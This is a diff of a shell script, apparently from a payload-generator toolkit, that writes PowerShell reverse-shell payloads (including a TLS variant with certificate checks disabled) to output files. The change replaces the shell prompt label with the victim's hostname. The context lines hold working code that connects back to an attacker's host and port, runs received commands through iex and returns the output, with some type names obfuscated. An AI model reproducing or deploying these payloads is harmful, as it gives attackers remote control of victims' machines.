@@ -12659,7 +12659,7 @@ echo "\$socket = new-object \$PSArgException('$lhost', $lport);if(\$socket -eq \
 echo "\$writer = new-object System.IO.\$icmpv6(\$stream);\$buffer = new-object System.Byte[] 1024;" >> $IPATH/output/$NaM.ps1
 echo "\$comm = new-object \$NewObjectCommand;" >> $IPATH/output/$NaM.ps1
 echo "do{" >> $IPATH/output/$NaM.ps1
-echo "	\$writer.Write('[venom] ' + (pwd).Path + '> ');" >> $IPATH/output/$NaM.ps1
+echo "	\$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ');" >> $IPATH/output/$NaM.ps1
 echo "	\$writer.Flush();" >> $IPATH/output/$NaM.ps1
 echo "	\$read = \$null;" >> $IPATH/output/$NaM.ps1
 echo "	while(\$stream.DataAvailable -or (\$read = \$stream.Read(\$buffer, 0, 1024)) -eq \$null){};" >> $IPATH/output/$NaM.ps1
@@ -12879,14 +12879,14 @@ echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
 echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/$NaM.ps1
-echo "        \$writer.Write('[venom] ' + (pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
+echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
 echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
 echo "   \$data = (New-Object -TypeName \$PSArgsBuffer).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/$NaM.ps1
-echo "   \$sendback2 = \$sendback + '[venom] ' + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
+echo "   \$sendback2 = \$sendback + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/$NaM.ps1
 echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/$NaM.ps1
 echo "}" >> $IPATH/output/$NaM.ps1
@@ -13886,7 +13886,7 @@ echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
 echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/Client.ps1
-echo "        \$writer.Write('[venom] ' + (pwd).Path + '> ')" >> $IPATH/output/Client.ps1
+echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $IPATH/output/Client.ps1
 echo "        \$writer.flush()" >> $IPATH/output/Client.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
@@ -13894,7 +13894,7 @@ echo "Start-Sleep -Milliseconds 250" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
 echo "   \$data = (New-Object -TypeName \$PSArgsBuffer).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
-echo "   \$sendback2 = \$sendback + '[venom] ' + (pwd).Path + '> ';" >> $IPATH/output/Client.ps1
+echo "   \$sendback2 = \$sendback + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/Client.ps1
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/Client.ps1
 echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/Client.ps1
 echo "}" >> $IPATH/output/Client.ps1
